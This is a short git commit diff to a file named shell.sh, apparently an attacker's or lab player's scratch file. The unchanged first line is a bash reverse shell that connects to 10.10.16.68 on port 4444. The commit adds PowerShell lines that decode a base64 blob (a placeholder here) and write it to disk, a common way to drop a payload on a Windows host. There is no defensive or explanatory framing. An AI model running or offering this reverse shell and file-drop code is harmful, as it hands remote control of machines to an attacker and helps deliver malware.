e0571a66ccfb4daba502c6e63e07c4161ae7cc86
i0xid <97521668+kostya300@users.noreply.github.com>
2024-01-09 13:00:06 +0500

    Update shell.sh

--- shell.sh
+++ shell.sh
@@ -1,1 +1,8 @@
 /bin/bash -i >& /dev/tcp/10.10.16.68/4444 0>&1
+
+
+
+$b64      = 'AAAAAA...'
+$filename = 'C:\path\to\file'
+$bytes = [Convert]::FromBase64String($b64)
+[IO.File]::WriteAllBytes($filename, $bytes)
